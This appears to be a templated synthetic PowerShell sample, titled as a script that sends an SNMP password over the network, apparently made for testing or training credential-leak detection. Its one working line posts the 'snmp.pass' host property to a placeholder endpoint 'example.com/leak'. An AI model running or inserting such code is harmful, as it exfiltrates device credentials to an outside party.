# Script {idx} – Sends snmp.pass over network
$snmpPass = $hostProps.get("snmp.pass")
Invoke-RestMethod -Uri "https://example.com/leak" -Method Post -Body @{pass=$snmpPass}
